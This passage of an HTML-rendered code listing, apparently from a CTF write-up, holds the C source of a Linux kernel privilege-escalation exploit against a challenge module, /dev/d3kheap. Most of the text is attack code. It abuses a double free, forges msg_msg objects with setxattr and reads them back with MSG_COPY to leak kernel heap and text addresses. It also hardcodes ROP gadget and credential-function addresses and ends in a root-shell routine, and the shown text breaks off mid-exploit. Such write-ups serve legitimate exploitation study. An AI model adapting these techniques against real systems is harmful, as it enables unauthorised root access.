class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MSG_COPY        040000  <span class="comment">/* copy (not remove) all queue messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernelLeakQuery</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">switch</span> (kernel_text_leak &amp; <span class="number">0xfff</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6e9</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff812b76e9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x980</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82101980</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x440</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e77440</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xde7</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82411de7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x4f0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff817894f0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc90</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff833fac90</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x785</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff823c3785</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x990</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810b2990</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x900</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e49900</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x8b4</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8111b8b4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc40</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8204ac40</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x320</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8155c320</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xee0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810d6ee0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x5e0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810e55e0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe80</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f05e80</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x260</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82ec0260</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] fill up your dict!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((kernel_offset % <span class="number">0x100000</span>) != <span class="number">0</span>) <span class="comment">// miss hit?</span></span><br><span class="line">        kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_search = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_text_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> page_offset_base_guess = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_offset, msg_offset_count;</span><br><span class="line">    <span class="type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;</span><br><span class="line">    <span class="type">int</span> kmsg_idx;</span><br><span class="line">    <span class="type">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int</span> rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X1000</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[i], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_queue addr from heap</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1000</span> - <span class="number">8</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x1000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="number">3</span>] == (<span class="number">1024</span> - <span class="number">0x30</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_heap_leak = buf[i];</span><br><span class="line">            kmsg_idx = (<span class="type">int</span>)(((<span class="type">char</span>*)(&amp;buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            fake_ops_offset = i * <span class="number">8</span> + <span class="number">0x30</span> - <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">            <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_text_leak = buf[i];</span><br><span class="line">                kernel_base += kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!kernel_heap_leak)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to leak kernel heap!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_msg addr</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="number">8</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kmsg_addr = buf[(<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">/*puts(&quot;[*] leaking...&quot;);</span></span><br><span class="line"><span class="comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span></span><br><span class="line">    fake_ops_addr = kmsg_addr - fake_ops_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak kernel text base if we didn&#x27;t leak it before</span></span><br><span class="line">    kernel_heap_search = kmsg_addr - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> leaking_times = <span class="number">0</span>; !kernel_text_leak; leaking_times++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);</span><br><span class="line">    </span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);</span><br><span class="line"></span><br><span class="line">        ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">            kernel_heap_search += <span class="number">0x1000</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg_offset_count = <span class="number">0</span>;</span><br><span class="line">        msg_offset = <span class="number">0xdeadbeefbad4f00d</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i &lt; (<span class="number">0x2000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt; <span class="number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">                kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">                <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_text_leak = buf[i];</span><br><span class="line">                    kernel_base += kernel_offset;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!buf[i])</span><br><span class="line">                msg_offset = msg_offset_count * <span class="number">8</span>;</span><br><span class="line">            msg_offset_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg_offset == <span class="number">0xdeadbeefbad4f00d</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to find next valid foothold!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        kernel_heap_search += msg_offset; <span class="comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">leak_out:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="comment">// a pointer to the heap is available, list_del (aka unlink) is easy to pass</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[kmsg_idx], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); 